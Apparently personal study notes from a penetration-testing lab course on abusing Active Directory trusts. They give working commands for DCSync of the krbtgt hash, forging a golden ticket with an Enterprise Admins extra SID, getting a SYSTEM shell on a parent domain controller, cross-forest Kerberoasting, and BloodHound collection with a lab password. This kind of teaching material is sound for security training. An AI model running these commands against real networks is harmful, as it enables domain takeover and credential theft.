The idea here is that we spoof our own `hacker` account as an Enterprise Admin in our target parent domain (`INLANEFREIGHT.LOCAL`). We then obtain a golden ticket (TGT) for this account which grants us access to resources in the parent domain.

### Attacking Child -> Parent Trusts from Linux

We need the same bits of information:

* KRBTGT hash in child domain
* SID of child domain
* Name of a target user in child domain (`hacker`)
* FQDN of child domain
* SID of Enterprise Admins group of root domain

DCSync with `secretsdump.py`: `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`

* To get NT hash of `krbtgt` account.

SID Brute-forcing: `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`

* Here, we specify the IP address of the DC in the child domain.
* This returns the SID of the domain, as well as the RIDs of the users. SIDs of users can be derived by appending RID to the end of SID (e.g., if SID of domain is `S-1-5-21-2806153819-209893948-922872689` and RID of `lab_adm` user is `1001`, then the user SID is `S-1-5-21-2806153819-209893948-922872689-1001`)
* However, our main interest here is the domain SID. `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"`

Likewise, we get SID of the Enterprise Admins group in the root domain by using the IP address of the root DC: `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"`

Finally, we can use `ticketer.py` to generate golden tickets:
`ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker`

* Child domain SID is under `-domain-sid` option, Enterprise Admins group SID is under `-extra-sid` option

The ticket is saved as `ccache` file, which we set as our `KRB5CCNAME` environment variable:
`export KRB5CCNAME=hacker.ccache`

Finally, get a SYSTEM shell on the DC using this ticket:
`psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5`

We can also use `raiseChild.py` to automate the escalation of child to parent domain.

* Specify the target DC and credentials for an admin user in the child domain.
* `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`

Running `secretsdump` on a specified user with golden ticket:
`secretsdump.py -k -no-pass logistics.inlanefreight.local/hacker@academy-ea-dc01.inlanefreight.local -just-dc-user bross -target-ip 172.16.5.5`

### Cross-Forest Trust Abuse from Windows

#### Kerberoasting

Cross Forest Kerberoasting can be useful to obtain credentials for an administrative user in another domain, with Domain/Enterprise Admin privileges in both domains.

Likewise, start off by enumerating accounts with SPNs:
`Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName`

* To enumerate the account membership, select `memberof` as well.

Then, Kerberoast the user with `Rubeus`, but pass in the `/domain` option:
`.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`

Once the passwords are cracked, it is worth checking for reuse in the other domain.

Also consider group memberships - admins in one domain may also be part of an admin group in another domain, due to Domain Local Groups allowing principals outside its forest.

* We can enumerate groups with such users using `Get-DomainForeignGroupMember`, to check for foreign group membership.
  `Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL`
  Then, convert member SID to its name using `Convert-SidToName`

SID History can also be abused across forest trusts. If SID filtering is not implemented, suppose that user with administrative privileges in one domain is migrated to another trusted domain.

* This user retains their administrative privileges in the previous domain.

### Cross-Forest Trust Abuse from Linux

#### Kerberoasting

Likewise, we can use `GetUserSPNs.py` for this. We need to specify the `-target-domain` option for our targeted, cross-forest domain.

* Enumeration: `GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
* Ticket generation: `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`. We can use `-outputfile` as well, to pipe output to a hash file for cracking.

To check for foreign group membership, we can use `bloodhound-python` to collect data, then ingest it into the GUI for analysis.

* Firstly, add the DNS entry for the domain into `/etc/resolv.conf`:

```
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

* Then, run the tool: `bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`. Compress the `json` files into a `zip` archive: `zip -r ilfreight_bh.zip *.json`
* Repeat this process for domains in other forests: `bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2`
* In BloodHound, click on `Users with Foreign Domain Group Membership` under the `Analysis` tab, and select the source domain as our domain of interest.

## AD Auditing Tools

AD Explorer - GUI tool to explore the AD configuration.

`PingCastle` - tool to evaluate security posture of AD environment, with results in maps and graphs.

`group3r.exe` - tool to find AD GPO vulnerabilities.

`ADRecon` - PowerShell tool to enumerate AD.
